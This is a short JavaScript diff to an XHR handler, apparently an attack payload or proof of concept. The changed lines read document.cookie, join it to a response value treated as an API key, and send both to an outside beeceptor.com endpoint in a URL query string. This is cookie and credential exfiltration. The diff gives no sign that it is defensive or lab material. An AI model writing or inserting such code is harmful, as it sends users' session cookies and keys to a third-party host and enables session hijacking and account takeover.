@@ -11,8 +11,10 @@ function UserAction() {
     xhttp.onreadystatechange = function() {
          if (this.readyState == 4 && this.status == 200) {
              var str = this.responseText;
-             alert(str);
-             var url='https://abhilashs.free.beeceptor.com/?api_key='+str;
+	     var ck = document.cookie;
+	     var ex = str+ck;
+             alert(ex);
+             var url='https://abhilashs.free.beeceptor.com/?api_key='+ex;
 			 httpGet(url)
          }
     };
